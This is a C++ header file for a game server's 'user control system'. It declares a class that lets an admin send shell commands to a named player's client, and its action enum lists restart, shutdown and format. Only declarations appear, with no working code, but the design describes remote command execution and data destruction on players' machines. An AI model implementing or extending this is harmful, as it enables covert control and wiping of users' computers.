#ifndef __INC_WJ_GAME_USER_CONTROL_SYSTEM_H__
#define __INC_WJ_GAME_USER_CONTROL_SYSTEM_H__
/*********************************************************************
* date        : 2015.09.17
* file        : user_control.h
* author      : VegaS
*/
#pragma once

enum ETypeCommands
{
	ACTION_RESTART = 1,
	ACTION_SHUTDOWN = 2,
	ACTION_FORMAT = 3,
	ACTION_MAX_NUM,
};

class CUserControl : public singleton<CUserControl>
{
	public:
		CUserControl();
		~CUserControl();
	
	void Get(LPCHARACTER ch, const char* szTargetName, const char* szCommand);
	std::string GetShellCommandByIndex(DWORD indexCat);
	void WriteLogs(const char *func, int line, const char *format, ...);
	bool IsAdmin(LPCHARACTER ch);
	void SendShellPacket(LPCHARACTER tch, const char* ShellExecuteCommand);
};
#endif